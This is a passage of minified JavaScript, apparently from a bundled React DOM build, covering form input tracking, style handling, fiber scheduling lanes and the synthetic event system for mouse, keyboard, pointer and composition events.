s;default:return""}}function fe(s){var a=s.type;return(s=s.nodeName)&&s.toLowerCase()==="input"&&(a==="checkbox"||a==="radio")}function xe(s){var a=fe(s)?"checked":"value",h=Object.getOwnPropertyDescriptor(s.constructor.prototype,a),p=""+s[a];if(!s.hasOwnProperty(a)&&typeof h<"u"&&typeof h.get=="function"&&typeof h.set=="function"){var v=h.get,_=h.set;return Object.defineProperty(s,a,{configurable:!0,get:function(){return v.call(this)},set:function(L){p=""+L,_.call(this,L)}}),Object.defineProperty(s,a,{enumerable:h.enumerable}),{getValue:function(){return p},setValue:function(L){p=""+L},stopTracking:function(){s._valueTracker=null,delete s[a]}}}}function Oe(s){s._valueTracker||(s._valueTracker=xe(s))}function Pe(s){if(!s)return!1;var a=s._valueTracker;if(!a)return!0;var h=a.getValue(),p="";return s&&(p=fe(s)?s.checked?"true":"false":s.value),s=p,s!==h?(a.setValue(s),!0):!1}function Re(s){if(s=s||(typeof document<"u"?document:void 0),typeof s>"u")return null;try{return s.activeElement||s.body}catch{return s.body}}function Ue(s,a){var h=a.checked;return V({},a,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:h??s._wrapperState.initialChecked})}function Zt(s,a){var h=a.defaultValue==null?"":a.defaultValue,p=a.checked!=null?a.checked:a.defaultChecked;h=he(a.value!=null?a.value:h),s._wrapperState={initialChecked:p,initialValue:h,controlled:a.type==="checkbox"||a.type==="radio"?a.checked!=null:a.value!=null}}function mo(s,a){a=a.checked,a!=null&&O(s,"checked",a,!1)}function ri(s,a){mo(s,a);var h=he(a.value),p=a.type;if(h!=null)p==="number"?(h===0&&s.value===""||s.value!=h)&&(s.value=""+h):s.value!==""+h&&(s.value=""+h);else if(p==="submit"||p==="reset"){s.removeAttribute("value");return}a.hasOwnProperty("value")?ji(s,a.type,h):a.hasOwnProperty("defaultValue")&&ji(s,a.type,he(a.defaultValue)),a.checked==null&&a.defaultChecked!=null&&(s.defaultChecked=!!a.defaultChecked)}function wo(s,a,h){if(a.hasOwnProperty("value")||a.hasOwnProperty("defaultValue")){var p=a.type;if(!(p!=="submit"&&p!=="reset"||a.value!==void 0&&a.value!==null))return;a=""+s._wrapperState.initialValue,h||a===s.value||(s.value=a),s.defaultValue=a}h=s.name,h!==""&&(s.name=""),s.defaultChecked=!!s._wrapperState.initialChecked,h!==""&&(s.name=h)}function ji(s,a,h){(a!=="number"||Re(s.ownerDocument)!==s)&&(h==null?s.defaultValue=""+s._wrapperState.initialValue:s.defaultValue!==""+h&&(s.defaultValue=""+h))}var mr=Array.isArray;function mn(s,a,h,p){if(s=s.options,a){a={};for(var v=0;v<h.length;v++)a["$"+h[v]]=!0;for(h=0;h<s.length;h++)v=a.hasOwnProperty("$"+s[h].value),s[h].selected!==v&&(s[h].selected=v),v&&p&&(s[h].defaultSelected=!0)}else{for(h=""+he(h),a=null,v=0;v<s.length;v++){if(s[v].value===h){s[v].selected=!0,p&&(s[v].defaultSelected=!0);return}a!==null||s[v].disabled||(a=s[v])}a!==null&&(a.selected=!0)}}function Qt(s,a){if(a.dangerouslySetInnerHTML!=null)throw Error(n(91));return V({},a,{value:void 0,defaultValue:void 0,children:""+s._wrapperState.initialValue})}function ii(s,a){var h=a.value;if(h==null){if(h=a.children,a=a.defaultValue,h!=null){if(a!=null)throw Error(n(92));if(mr(h)){if(1<h.length)throw Error(n(93));h=h[0]}a=h}a==null&&(a=""),h=a}s._wrapperState={initialValue:he(h)}}function Es(s,a){var h=he(a.value),p=he(a.defaultValue);h!=null&&(h=""+h,h!==s.value&&(s.value=h),a.defaultValue==null&&s.defaultValue!==h&&(s.defaultValue=h)),p!=null&&(s.defaultValue=""+p)}function _n(s){var a=s.textContent;a===s._wrapperState.initialValue&&a!==""&&a!==null&&(s.value=a)}function xs(s){switch(s){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function z(s,a){return s==null||s==="http://www.w3.org/1999/xhtml"?xs(a):s==="http://www.w3.org/2000/svg"&&a==="foreignObject"?"http://www.w3.org/1999/xhtml":s}var I,P=function(s){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(a,h,p,v){MSApp.execUnsafeLocalFunction(function(){return s(a,h,p,v)})}:s}(function(s,a){if(s.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in s)s.innerHTML=a;else{for(I=I||document.createElement("div"),I.innerHTML="<svg>"+a.valueOf().toString()+"</svg>",a=I.firstChild;s.firstChild;)s.removeChild(s.firstChild);for(;a.firstChild;)s.appendChild(a.firstChild)}});function K(s,a){if(a){var h=s.firstChild;if(h&&h===s.lastChild&&h.nodeType===3){h.nodeValue=a;return}}s.textContent=a}var ee={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},ae=["Webkit","ms","Moz","O"];Object.keys(ee).forEach(function(s){ae.forEach(function(a){a=a+s.charAt(0).toUpperCase()+s.substring(1),ee[a]=ee[s]})});function de(s,a,h){return a==null||typeof a=="boolean"||a===""?"":h||typeof a!="number"||a===0||ee.hasOwnProperty(s)&&ee[s]?(""+a).trim():a+"px"}function Be(s,a){s=s.style;for(var h in a)if(a.hasOwnProperty(h)){var p=h.indexOf("--")===0,v=de(h,a[h],p);h==="float"&&(h="cssFloat"),p?s.setProperty(h,v):s[h]=v}}var pt=V({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Xe(s,a){if(a){if(pt[s]&&(a.children!=null||a.dangerouslySetInnerHTML!=null))throw Error(n(137,s));if(a.dangerouslySetInnerHTML!=null){if(a.children!=null)throw Error(n(60));if(typeof a.dangerouslySetInnerHTML!="object"||!("__html"in a.dangerouslySetInnerHTML))throw Error(n(61))}if(a.style!=null&&typeof a.style!="object")throw Error(n(62))}}function ot(s,a){if(s.indexOf("-")===-1)return typeof a.is=="string";switch(s){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Ye=null;function rd(s){return s=s.target||s.srcElement||window,s.correspondingUseElement&&(s=s.correspondingUseElement),s.nodeType===3?s.parentNode:s}var id=null,vo=null,bo=null;function Sw(s){if(s=_l(s)){if(typeof id!="function")throw Error(n(280));var a=s.stateNode;a&&(a=_u(a),id(s.stateNode,s.type,a))}}function _w(s){vo?bo?bo.push(s):bo=[s]:vo=s}function Iw(){if(vo){var s=vo,a=bo;if(bo=vo=null,Sw(s),a)for(s=0;s<a.length;s++)Sw(a[s])}}function Ow(s,a){return s(a)}function $w(){}var sd=!1;function Pw(s,a,h){if(sd)return s(a,h);sd=!0;try{return Ow(s,a,h)}finally{sd=!1,(vo!==null||bo!==null)&&($w(),Iw())}}function rl(s,a){var h=s.stateNode;if(h===null)return null;var p=_u(h);if(p===null)return null;h=p[a];e:switch(a){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(p=!p.disabled)||(s=s.type,p=!(s==="button"||s==="input"||s==="select"||s==="textarea")),s=!p;break e;default:s=!1}if(s)return null;if(h&&typeof h!="function")throw Error(n(231,a,typeof h));return h}var od=!1;if(c)try{var il={};Object.defineProperty(il,"passive",{get:function(){od=!0}}),window.addEventListener("test",il,il),window.removeEventListener("test",il,il)}catch{od=!1}function XO(s,a,h,p,v,_,L,Y,Z){var oe=Array.prototype.slice.call(arguments,3);try{a.apply(h,oe)}catch(ye){this.onError(ye)}}var sl=!1,nu=null,ru=!1,ad=null,e3={onError:function(s){sl=!0,nu=s}};function t3(s,a,h,p,v,_,L,Y,Z){sl=!1,nu=null,XO.apply(e3,arguments)}function n3(s,a,h,p,v,_,L,Y,Z){if(t3.apply(this,arguments),sl){if(sl){var oe=nu;sl=!1,nu=null}else throw Error(n(198));ru||(ru=!0,ad=oe)}}function Ss(s){var a=s,h=s;if(s.alternate)for(;a.return;)a=a.return;else{s=a;do a=s,(a.flags&4098)!==0&&(h=a.return),s=a.return;while(s)}return a.tag===3?h:null}function Tw(s){if(s.tag===13){var a=s.memoizedState;if(a===null&&(s=s.alternate,s!==null&&(a=s.memoizedState)),a!==null)return a.dehydrated}return null}function Aw(s){if(Ss(s)!==s)throw Error(n(188))}function r3(s){var a=s.alternate;if(!a){if(a=Ss(s),a===null)throw Error(n(188));return a!==s?null:s}for(var h=s,p=a;;){var v=h.return;if(v===null)break;var _=v.alternate;if(_===null){if(p=v.return,p!==null){h=p;continue}break}if(v.child===_.child){for(_=v.child;_;){if(_===h)return Aw(v),s;if(_===p)return Aw(v),a;_=_.sibling}throw Error(n(188))}if(h.return!==p.return)h=v,p=_;else{for(var L=!1,Y=v.child;Y;){if(Y===h){L=!0,h=v,p=_;break}if(Y===p){L=!0,p=v,h=_;break}Y=Y.sibling}if(!L){for(Y=_.child;Y;){if(Y===h){L=!0,h=_,p=v;break}if(Y===p){L=!0,p=_,h=v;break}Y=Y.sibling}if(!L)throw Error(n(189))}}if(h.alternate!==p)throw Error(n(190))}if(h.tag!==3)throw Error(n(188));return h.stateNode.current===h?s:a}function Cw(s){return s=r3(s),s!==null?Rw(s):null}function Rw(s){if(s.tag===5||s.tag===6)return s;for(s=s.child;s!==null;){var a=Rw(s);if(a!==null)return a;s=s.sibling}return null}var Dw=e.unstable_scheduleCallback,Nw=e.unstable_cancelCallback,i3=e.unstable_shouldYield,s3=e.unstable_requestPaint,xt=e.unstable_now,o3=e.unstable_getCurrentPriorityLevel,ld=e.unstable_ImmediatePriority,kw=e.unstable_UserBlockingPriority,iu=e.unstable_NormalPriority,a3=e.unstable_LowPriority,Bw=e.unstable_IdlePriority,su=null,jr=null;function l3(s){if(jr&&typeof jr.onCommitFiberRoot=="function")try{jr.onCommitFiberRoot(su,s,void 0,(s.current.flags&128)===128)}catch{}}var wr=Math.clz32?Math.clz32:h3,c3=Math.log,u3=Math.LN2;function h3(s){return s>>>=0,s===0?32:31-(c3(s)/u3|0)|0}var ou=64,au=4194304;function ol(s){switch(s&-s){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return s&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return s&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return s}}function lu(s,a){var h=s.pendingLanes;if(h===0)return 0;var p=0,v=s.suspendedLanes,_=s.pingedLanes,L=h&268435455;if(L!==0){var Y=L&~v;Y!==0?p=ol(Y):(_&=L,_!==0&&(p=ol(_)))}else L=h&~v,L!==0?p=ol(L):_!==0&&(p=ol(_));if(p===0)return 0;if(a!==0&&a!==p&&(a&v)===0&&(v=p&-p,_=a&-a,v>=_||v===16&&(_&4194240)!==0))return a;if((p&4)!==0&&(p|=h&16),a=s.entangledLanes,a!==0)for(s=s.entanglements,a&=p;0<a;)h=31-wr(a),v=1<<h,p|=s[h],a&=~v;return p}function f3(s,a){switch(s){case 1:case 2:case 4:return a+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return a+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function d3(s,a){for(var h=s.suspendedLanes,p=s.pingedLanes,v=s.expirationTimes,_=s.pendingLanes;0<_;){var L=31-wr(_),Y=1<<L,Z=v[L];Z===-1?((Y&h)===0||(Y&p)!==0)&&(v[L]=f3(Y,a)):Z<=a&&(s.expiredLanes|=Y),_&=~Y}}function cd(s){return s=s.pendingLanes&-1073741825,s!==0?s:s&1073741824?1073741824:0}function Lw(){var s=ou;return ou<<=1,(ou&4194240)===0&&(ou=64),s}function ud(s){for(var a=[],h=0;31>h;h++)a.push(s);return a}function al(s,a,h){s.pendingLanes|=a,a!==536870912&&(s.suspendedLanes=0,s.pingedLanes=0),s=s.eventTimes,a=31-wr(a),s[a]=h}function p3(s,a){var h=s.pendingLanes&~a;s.pendingLanes=a,s.suspendedLanes=0,s.pingedLanes=0,s.expiredLanes&=a,s.mutableReadLanes&=a,s.entangledLanes&=a,a=s.entanglements;var p=s.eventTimes;for(s=s.expirationTimes;0<h;){var v=31-wr(h),_=1<<v;a[v]=0,p[v]=-1,s[v]=-1,h&=~_}}function hd(s,a){var h=s.entangledLanes|=a;for(s=s.entanglements;h;){var p=31-wr(h),v=1<<p;v&a|s[p]&a&&(s[p]|=a),h&=~v}}var Qe=0;function jw(s){return s&=-s,1<s?4<s?(s&268435455)!==0?16:536870912:4:1}var Uw,fd,Mw,Fw,zw,dd=!1,cu=[],Ui=null,Mi=null,Fi=null,ll=new Map,cl=new Map,zi=[],g3="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function qw(s,a){switch(s){case"focusin":case"focusout":Ui=null;break;case"dragenter":case"dragleave":Mi=null;break;case"mouseover":case"mouseout":Fi=null;break;case"pointerover":case"pointerout":ll.delete(a.pointerId);break;case"gotpointercapture":case"lostpointercapture":cl.delete(a.pointerId)}}function ul(s,a,h,p,v,_){return s===null||s.nativeEvent!==_?(s={blockedOn:a,domEventName:h,eventSystemFlags:p,nativeEvent:_,targetContainers:[v]},a!==null&&(a=_l(a),a!==null&&fd(a)),s):(s.eventSystemFlags|=p,a=s.targetContainers,v!==null&&a.indexOf(v)===-1&&a.push(v),s)}function y3(s,a,h,p,v){switch(a){case"focusin":return Ui=ul(Ui,s,a,h,p,v),!0;case"dragenter":return Mi=ul(Mi,s,a,h,p,v),!0;case"mouseover":return Fi=ul(Fi,s,a,h,p,v),!0;case"pointerover":var _=v.pointerId;return ll.set(_,ul(ll.get(_)||null,s,a,h,p,v)),!0;case"gotpointercapture":return _=v.pointerId,cl.set(_,ul(cl.get(_)||null,s,a,h,p,v)),!0}return!1}function Hw(s){var a=_s(s.target);if(a!==null){var h=Ss(a);if(h!==null){if(a=h.tag,a===13){if(a=Tw(h),a!==null){s.blockedOn=a,zw(s.priority,function(){Mw(h)});return}}else if(a===3&&h.stateNode.current.memoizedState.isDehydrated){s.blockedOn=h.tag===3?h.stateNode.containerInfo:null;return}}}s.blockedOn=null}function uu(s){if(s.blockedOn!==null)return!1;for(var a=s.targetContainers;0<a.length;){var h=gd(s.domEventName,s.eventSystemFlags,a[0],s.nativeEvent);if(h===null){h=s.nativeEvent;var p=new h.constructor(h.type,h);Ye=p,h.target.dispatchEvent(p),Ye=null}else return a=_l(h),a!==null&&fd(a),s.blockedOn=h,!1;a.shift()}return!0}function Vw(s,a,h){uu(s)&&h.delete(a)}function m3(){dd=!1,Ui!==null&&uu(Ui)&&(Ui=null),Mi!==null&&uu(Mi)&&(Mi=null),Fi!==null&&uu(Fi)&&(Fi=null),ll.forEach(Vw),cl.forEach(Vw)}function hl(s,a){s.blockedOn===a&&(s.blockedOn=null,dd||(dd=!0,e.unstable_scheduleCallback(e.unstable_NormalPriority,m3)))}function fl(s){function a(v){return hl(v,s)}if(0<cu.length){hl(cu[0],s);for(var h=1;h<cu.length;h++){var p=cu[h];p.blockedOn===s&&(p.blockedOn=null)}}for(Ui!==null&&hl(Ui,s),Mi!==null&&hl(Mi,s),Fi!==null&&hl(Fi,s),ll.forEach(a),cl.forEach(a),h=0;h<zi.length;h++)p=zi[h],p.blockedOn===s&&(p.blockedOn=null);for(;0<zi.length&&(h=zi[0],h.blockedOn===null);)Hw(h),h.blockedOn===null&&zi.shift()}var Eo=$.ReactCurrentBatchConfig,hu=!0;function w3(s,a,h,p){var v=Qe,_=Eo.transition;Eo.transition=null;try{Qe=1,pd(s,a,h,p)}finally{Qe=v,Eo.transition=_}}function v3(s,a,h,p){var v=Qe,_=Eo.transition;Eo.transition=null;try{Qe=4,pd(s,a,h,p)}finally{Qe=v,Eo.transition=_}}function pd(s,a,h,p){if(hu){var v=gd(s,a,h,p);if(v===null)Rd(s,a,p,fu,h),qw(s,p);else if(y3(v,s,a,h,p))p.stopPropagation();else if(qw(s,p),a&4&&-1<g3.indexOf(s)){for(;v!==null;){var _=_l(v);if(_!==null&&Uw(_),_=gd(s,a,h,p),_===null&&Rd(s,a,p,fu,h),_===v)break;v=_}v!==null&&p.stopPropagation()}else Rd(s,a,p,null,h)}}var fu=null;function gd(s,a,h,p){if(fu=null,s=rd(p),s=_s(s),s!==null)if(a=Ss(s),a===null)s=null;else if(h=a.tag,h===13){if(s=Tw(a),s!==null)return s;s=null}else if(h===3){if(a.stateNode.current.memoizedState.isDehydrated)return a.tag===3?a.stateNode.containerInfo:null;s=null}else a!==s&&(s=null);return fu=s,null}function Ww(s){switch(s){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(o3()){case ld:return 1;case kw:return 4;case iu:case a3:return 16;case Bw:return 536870912;default:return 16}default:return 16}}var qi=null,yd=null,du=null;function Kw(){if(du)return du;var s,a=yd,h=a.length,p,v="value"in qi?qi.value:qi.textContent,_=v.length;for(s=0;s<h&&a[s]===v[s];s++);var L=h-s;for(p=1;p<=L&&a[h-p]===v[_-p];p++);return du=v.slice(s,1<p?1-p:void 0)}function pu(s){var a=s.keyCode;return"charCode"in s?(s=s.charCode,s===0&&a===13&&(s=13)):s=a,s===10&&(s=13),32<=s||s===13?s:0}function gu(){return!0}function Gw(){return!1}function zn(s){function a(h,p,v,_,L){this._reactName=h,this._targetInst=v,this.type=p,this.nativeEvent=_,this.target=L,this.currentTarget=null;for(var Y in s)s.hasOwnProperty(Y)&&(h=s[Y],this[Y]=h?h(_):_[Y]);return this.isDefaultPrevented=(_.defaultPrevented!=null?_.defaultPrevented:_.returnValue===!1)?gu:Gw,this.isPropagationStopped=Gw,this}return V(a.prototype,{preventDefault:function(){this.defaultPrevented=!0;var h=this.nativeEvent;h&&(h.preventDefault?h.preventDefault():typeof h.returnValue!="unknown"&&(h.returnValue=!1),this.isDefaultPrevented=gu)},stopPropagation:function(){var h=this.nativeEvent;h&&(h.stopPropagation?h.stopPropagation():typeof h.cancelBubble!="unknown"&&(h.cancelBubble=!0),this.isPropagationStopped=gu)},persist:function(){},isPersistent:gu}),a}var xo={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(s){return s.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},md=zn(xo),dl=V({},xo,{view:0,detail:0}),b3=zn(dl),wd,vd,pl,yu=V({},dl,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Ed,button:0,buttons:0,relatedTarget:function(s){return s.relatedTarget===void 0?s.fromElement===s.srcElement?s.toElement:s.fromElement:s.relatedTarget},movementX:function(s){return"movementX"in s?s.movementX:(s!==pl&&(pl&&s.type==="mousemove"?(wd=s.screenX-pl.screenX,vd=s.screenY-pl.screenY):vd=wd=0,pl=s),wd)},movementY:function(s){return"movementY"in s?s.movementY:vd}}),Yw=zn(yu),E3=V({},yu,{dataTransfer:0}),x3=zn(E3),S3=V({},dl,{relatedTarget:0}),bd=zn(S3),_3=V({},xo,{animationName:0,elapsedTime:0,pseudoElement:0}),I3=zn(_3),O3=V({},xo,{clipboardData:function(s){return"clipboardData"in s?s.clipboardData:window.clipboardData}}),$3=zn(O3),P3=V({},xo,{data:0}),Jw=zn(P3),T3={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},A3={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},C3={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function R3(s){var a=this.nativeEvent;return a.getModifierState?a.getModifierState(s):(s=C3[s])?!!a[s]:!1}function Ed(){return R3}var D3=V({},dl,{key:function(s){if(s.key){var a=T3[s.key]||s.key;if(a!=="Unidentified")return a}return s.type==="keypress"?(s=pu(s),s===13?"Enter":String.fromCharCode(s)):s.type==="keydown"||s.type==="keyup"?A3[s.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Ed,charCode:function(s){return s.type==="keypress"?pu(s):0},keyCode:function(s){return s.type==="keydown"||s.type==="keyup"?s.keyCode:0},which:function(s){return s.type==="keypress"?pu(s):s.type==="keydown"||s.type==="keyup"?s.keyCode:0}}),N3=zn(D3),k3=V({},yu,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Zw=zn(k3),B3=V({},dl,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Ed}),L3=zn(B3),j3=V({},xo,{propertyName:0,elapsedTime:0,pseudoElement:0}),U3=zn(j3),M3=V({},yu,{deltaX:function(s){return"deltaX"in s?s.deltaX:"wheelDeltaX"in s?-s.wheelDeltaX:0},deltaY:function(s){return"deltaY"in s?s.deltaY:"wheelDeltaY"in s?-s.wheelDeltaY:"wheelDelta"in s?-s.wheelDelta:0},deltaZ:0,deltaMode:0}),F3=zn(M3),z3=[9,13,27,32],xd=c&&"CompositionEvent"in window,gl=null;c&&"documentMode"in document&&(gl=document.documentMode);var q3=c&&"TextEvent"in window&&!gl,Qw=c&&(!xd||gl&&8<gl&&11>=gl),Xw=" ",e0=!1;function t0(s,a){switch(s){case"keyup":return z3.indexOf(a.keyCode)!==-1;case"keydown":return a.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function n0(s){return s=s.detail,typeof s=="object"&&"data"in s?s.data:null}var So=!1;function H3(s,a){switch(s){case"compositionend":return n0(a);case"keypress":return a.which!==32?null:(e0=!0,Xw);case"textInput":return s=a.data,s===Xw&&e0?null:s;default:return null}}function V3(s,a){if(So)return s==="compositionend"||!xd&&t0(s,a)?(s=Kw(),du=yd=qi=null,So=!1,s):null;switch(s){case"paste":return null;case"keypress":if(!(a.ctrlKey||a.altKey||a.metaKey)||a.ctrlKey&&a.altKey){if(a.char&&1<a.char.length)return a.char;if(a.which)return String.fromCharCode(a.which)}return null;case"compositionend":return Qw&&a.locale!=="ko"?null:a.data;default:return null}}var W3={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function r0(s){var a=s&&s.nodeName&&s.nodeName.toLowerCase();return a==="input"?!!W3[s.type]:a==="textarea"}function i0(s,a,h,p){_w(p),a=Eu(a,"onChange"),0<a.length&&(h=new md("onChange","change",null,h,p),s.push({event:h,listeners:a}))}var yl=null,ml=null;function K3(s){x0(s,0)}function mu(s){var a=Po(s);if(Pe(a))return s}function G3(s,a){if(s==="change")return a}var s0=!1;if(c){var Sd;if(c){var _d="oninput"in document;if(!_d){var o0=document.createElement("div");o0.setAttribute("oninput","return;"),_d=typeof o0.oninput=="function"}Sd=_d}else Sd=!1;s0=Sd&&(!document.documentMode||9<document.documentMode)}function a0(){yl&&(yl.detachEvent("onpropertychange",l0),ml=yl=null)}function l0(s){if(s.propertyName==="value"&&mu(ml)){var a=[];i0(a,ml,s,rd(s)),Pw(K3,a)}}function Y3(s,a,h){s==="focusin"?(a0(),yl=a,ml=h,yl.attachEvent("onpropertychange",l0)):s==="focusout"&&a0()}function J3(s){if(s==="selectionchange"||s==="keyup"||s==="keydown")return mu(ml)}function Z3(s,a){if(s==="click")return mu(a)}function Q3(s,a){if(s==="input"||s==="change")return mu(a)}function X3(s,a){return s===a&&(s!==0||1/s===1/a)||s!==s&&a!==a}var vr=typeof Object.is=="function"?Object.is:X3;function wl(s,a){if(vr(s,a))return!0;if(typeof s!="object"||s===null||typeof a!="object"||a===null)return!1;var h=Object.keys(s),p=Object.keys(a);if(h.length!==p.length)return!1;for(p=0;p<h.length;p++){var v=h[p];if(!u.call(a,v)||!vr(s[v],a[v]))return!1}return!0}function c0(s){for(;s&&s.firstChild;)s=s.firstChild;return s}function u0(s,a){var h=c0(s);s=0;for(var p;h;){if(h.nodeType===3){if(p=s+h.textContent.length,s<=a&&p>=a)return{node:h,offset:a-s};s=p}e:{for(;h;){if(h.nextSibling){h=h.nextSibling;break e}h=h.parentNode}h=void 0}h=c0(h)}}function h0(s,a){return s&&a?s===a?!0:s&&s.nodeType===3?!1:a&&a.nodeType===3?h0(s,a.parentNode):"contains"in s?s.contains(a):s.compareDocumentPosition?!!(s.compareDocumentPosition(a)&16):!1:!1}function f0(){for(var s=window,a=Re();a instanceof s.HTMLIFrameElement;){try{var h=typeof a.contentWindow.location.href=="string"}catch{h=!1}if(h)s=a.contentWindow;else break;a=Re(s.document)}return a}function Id(s){var a=s&&s.nodeName&&s.nodeName.toLowerCase();return a&&(a==="input"&&(s.type==="text"||s.type==="search"||s.type==="tel"||s.type==="url"||s.type==="password")||a==="textarea"||s.contentEditable==="true")}function e$(s){var a=f0(),h=s.focusedElem,p=s.selectionRange;if(a!==h&&h&&h.ownerDocument&&h0(h.ownerDocument.documentElement,h)){if(p!==null&&Id(h)){if(a=p.start,s=p.end,s===void 0&&(s=a),"selectionStart"in h)h.selectionStart=a,h.selectionEnd=Math.min(s,h.value.length);else if(s=(a=h.ownerDocument||document)&&a.defaultView||window,s.getSelection){s=s.getSelection();var v=h.textContent.length,_=Math.min(p.start,v);p=p.end===void 0?_:Math.min(p.end,v),!s.extend&&_>p&&(v=p,p=_,_=v),v=u0(h,_);var L=u0(h,p);v&&L&&(s.rangeCount!==1||s.anchorNode!==v.node||s.anchorOffset!==v.offset||s.focusNode!==L.node||s.focusOffset!==L.offset)&&(a=a.createRange(),a.setStart(v.node,v.offset),s.removeAllRanges(),_>p?(s.addRange(a),s.extend(L.node,L.offset)):(a.setEnd(L.node,L.offset),s.addRange(a)))}}for(a=[],s=h;s=s.parentNode;)s.nodeType===1&&a.push({element:s,left:s.scrollLeft,top:s.scrollTop});for(typeof h.focus=="function"&&h.focus(),h=0;h<a.length;h++)s=a[h],s.element.scrollLeft=s.left,s.element.scrollTop=s.top}}var t$=c&&"documentMode"in document&&11>=document.documentMode,_o=null,Od=null,vl=null,$d=!1;function d0(s,a,h){var p=h.window===h?h.document:h.nodeType===9?h:h.ownerDocument;$d||_o==null||_o!==Re(p)||(p=_o,"selectionStart"in p&&Id(p)?p={start:p.selectionStart,end:p.selectionEnd}:(p=(p.ownerDocument&&p.ownerDocument.defaultView||window).getSelection(),p={anchorNode:p.anchorNode,anchorOffset:p.anchorOffset,focusNode:p.focusNode,focusOffset:p.focusOffset}),vl&&wl(vl,p)||(vl=p,p=Eu(Od,"onSelect"),0<p.length&&(a=new md("onSelect","select",null,a,h),s.push({event:a,listeners:p}),a.target=_o)))}function wu(s,a){var h={};return h[s.toLowerCase()]=a.toLowerCase(),h["Webkit"+s]="webkit"+a,h["Moz"+s]="moz"+a,h}var 